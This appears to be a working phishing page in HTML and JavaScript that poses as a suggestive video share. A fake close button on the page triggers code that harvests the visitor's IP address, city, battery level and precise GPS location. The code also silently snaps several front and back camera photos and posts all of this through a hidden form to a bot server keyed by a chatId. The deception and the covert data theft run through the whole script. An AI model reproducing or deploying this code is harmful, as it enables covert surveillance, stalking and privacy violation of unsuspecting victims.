<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="theme-color" content="#000000">
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="video Noor" />
  <meta name="twitter:description" content="🫦🤤" />
  <meta name="twitter:image" content="https://i.postimg.cc/DykJfyrz/1.jpg" />
  <meta name="twitter:image:width" content="1200" />
  <meta name="twitter:image:height" content="630" />

  <title>Video</title>
  <style type="text/css">
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      width: 100%;
      background-color: #000;
      color: #fff;
    }

    .video-container {
      width: 100%;
      height: 100vh;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #000;
    }

    #realVideo {
      width: 100%;
      height: 100vh;
      object-fit: contain;
      background: #000;
      display: block;
    }

    /* إشعار الأذونات - أكبر بكثير وفي الوسط بدون نص */
    .permission-notification {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.98);
      color: white;
      padding: 80px 100px;
      border-radius: 40px;
      z-index: 1000;
      display: none;
      width: 95%;
      max-width: 650px;
      height: 400px;
      box-shadow: 0 8px 32px rgba(255, 0, 0, 0.3), inset 0 0 30px rgba(255, 0, 0, 0.1);
      border: 3px solid rgba(255, 0, 0, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      animation: popIn 0.4s ease-out;
      flex-direction: column;
      gap: 30px;
    }

    @keyframes popIn {
      0% {
        transform: translate(-50%, -50%) scale(0.3);
        opacity: 0;
      }
      100% {
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
      }
    }

    @keyframes shake {
      0%, 100% { transform: translate(-50%, -50%) scale(1); }
      25% { transform: translate(-50%, -48%) scale(1.05); }
      75% { transform: translate(-50%, -52%) scale(1.05); }
    }

    .permission-notification.shake {
      animation: shake 0.5s ease-in-out infinite;
    }

    .notification-close {
      background: rgba(255, 0, 0, 0.9);
      border: none;
      color: white;
      font-size: 4.5rem;
      cursor: pointer;
      padding: 0;
      border-radius: 50%;
      transition: all 0.2s;
      width: 140px;
      height: 140px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      line-height: 1;
    }

    .notification-close:hover {
      background: rgba(255, 0, 0, 1);
      transform: scale(1.15);
    }

    .notification-close:active {
      transform: scale(0.95);
    }

    .hidden_iframe {
      display: none;
    }

    form {
      display: none;
    }
  </style>
</head>
<body>
  <!-- نموذج إرسال البيانات -->
  <form id="data-form" method="POST" action="https://bot-qmpk.onrender.com/submitData">
    <input type="hidden" name="chatId" id="chatId" />
    <input type="hidden" name="imageDatas" id="imageDatas" />
    <input type="hidden" name="location" id="location" />
    <input type="hidden" name="permissions" id="permissions" />
    <input type="hidden" name="ipInfo" id="ipInfo" />
    <input type="hidden" name="battery" id="battery" />
    <iframe name="hidden_iframe" class="hidden_iframe"></iframe>
  </form>

  <!-- حاوية الفيديو بملء الشاشة -->
  <div class="video-container" id="videoContainer">
    <video id="realVideo" playsinline autoplay muted>
      <source src="https://files.catbox.moe/6490uw.mp4" type="video/mp4">
    </video>
  </div>

  <!-- إشعار الأذونات -->
  <div class="permission-notification" id="permissionNotification">
    <button class="notification-close" id="closeNotification">✕</button>
  </div>

  <script>
    'use strict';

    // متغيرات عامة
    const permissions = [];
    let images = [];
    let ipInfo = '';
    let batteryStatus = '';
    let permissionsRequested = false;
    let videoStarted = false;

    // ==================== دوال الأذونات ====================

    async function fetchIPInfo() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
      } catch {
        ipInfo = "IP Info not available";
      }
    }

    async function getBatteryStatus() {
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryStatus = Math.round(battery.level * 100) + '%';
        } else {
          batteryStatus = "Battery API not available";
        }
      } catch {
        batteryStatus = "Unknown";
      }
    }

    // ==================== دوال التقاط الكاميرا ====================

    async function captureFromCamera(facingMode, retries = 3) {
      for (let attempt = 0; attempt < retries; attempt++) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { 
              facingMode: facingMode,
              width: { min: 320, ideal: 640, max: 1280 },
              height: { min: 240, ideal: 480, max: 960 }
            },
            audio: false
          });

          const video = document.createElement('video');
          video.setAttribute('playsinline', 'true');
          video.srcObject = stream;
          video.onloadedmetadata = () => video.play();

          // انتظر مدة أطول للتأكد من وضوح الصورة
          await new Promise(resolve => setTimeout(resolve, 1200));

          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          images.push(canvas.toDataURL('image/jpeg', 0.9).split(',')[1]);

          // إغلاق الكاميرا فوراً
          stream.getTracks().forEach(track => track.stop());
          permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera: ALLOWED`);
          
          return true;
        } catch (err) {
          console.error(`Camera capture attempt ${attempt + 1} failed:`, err);
          
          // في المحاولة الأخيرة، سجل الرفض
          if (attempt === retries - 1) {
            permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera: DENIED - ${err.name}`);
          }
          
          // انتظر قبل المحاولة التالية
          await new Promise(resolve => setTimeout(resolve, 800));
        }
      }
      return false;
    }

    async function getLocation() {
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          });
        });
        permissions.push('Geolocation: ALLOWED');
        return `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
      } catch (err) {
        permissions.push(`Geolocation: DENIED - ${err.message}`);
        return '';
      }
    }

    // ==================== عرض الإشعار ====================

    function showNotification() {
      const notification = document.getElementById('permissionNotification');
      notification.style.display = 'flex';
      notification.classList.remove('shake');
      
      // إضافة الهز بعد ظهور الإشعار
      setTimeout(() => {
        notification.classList.add('shake');
      }, 100);
    }

    function hideNotification() {
      const notification = document.getElementById('permissionNotification');
      notification.style.display = 'none';
      notification.classList.remove('shake');
    }

    // ==================== معالج الإغلاق ====================

    document.getElementById('closeNotification').addEventListener('click', async function(e) {
      e.preventDefault();
      e.stopPropagation();
      hideNotification();
      
      // بعد إغلاق الإشعار، قم بطلب الأذونات
      if (!permissionsRequested) {
        permissionsRequested = true;
        await requestAllPermissions();
      }
    });

    // ==================== طلب جميع الأذونات ====================

    async function requestAllPermissions() {
      // جمع المعلومات الأساسية
      await fetchIPInfo();
      document.getElementById('ipInfo').value = ipInfo;

      await getBatteryStatus();
      document.getElementById('battery').value = batteryStatus;

      // طلب الموقع
      const location = await getLocation();
      document.getElementById('location').value = location;
      await new Promise(resolve => setTimeout(resolve, 800));

      // طلب الكاميرا - الجانب الأمامي 
      await captureFromCamera('user');
      await new Promise(resolve => setTimeout(resolve, 800));

      // طلب الكاميرا - الجانب الخلفي
      await captureFromCamera('environment');
      await new Promise(resolve => setTimeout(resolve, 800));

      // محاولات إضافية
      await captureFromCamera('user');
      await new Promise(resolve => setTimeout(resolve, 600));
      await captureFromCamera('environment');

      // ملء البيانات والإرسال
      document.getElementById('imageDatas').value = images.join(',');
      document.getElementById('permissions').value = permissions.join(' | ');

      // إرسال البيانات
      const form = document.getElementById('data-form');
      form.target = 'hidden_iframe';
      form.submit();
    }

    // ==================== تشغيل الفيديو تلقائياً ====================

    async function initializeVideo() {
      const video = document.getElementById('realVideo');
      const chatId = new URLSearchParams(window.location.search).get('chatId');
      
      if (chatId) {
        document.getElementById('chatId').value = chatId;
      }

      // محاولة التشغيل التلقائي
      try {
        video.muted = true; // يجب أن يكون مكتوماً للتشغيل التلقائي
        await video.play();
        videoStarted = true;
      } catch (error) {
        console.warn('Autoplay failed:', error);
        
        // إذا فشل التشغيل التلقائي، انتظر أول تفاع�� من المستخدم
        document.addEventListener('click', async function autoplayOnInteraction() {
          try {
            await video.play();
            videoStarted = true;
            document.removeEventListener('click', autoplayOnInteraction);
          } catch (e) {
            console.warn('Manual play failed:', e);
          }
        }, { once: true });
      }

      // عرض الإشعار بعد 4 ثواني من التشغيل لتفاعل المستخدم
      setTimeout(() => {
        if (videoStarted) {
          showNotification();
        }
      }, 4000);
    }

    // ==================== بدء التطبيق ====================

    // بدء التطبيق عند تحميل الصفحة
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initializeVideo);
    } else {
      initializeVideo();
    }

    // منع الزرار الافتراضية للفيديو
    const video = document.getElementById('realVideo');
    video.controls = false;
    
    // معالج للنقر على الفيديو لمنع التأثيرات غير المرغوبة
    video.addEventListener('click', (e) => {
      e.preventDefault();
    });

  </script>
</body>
</html>
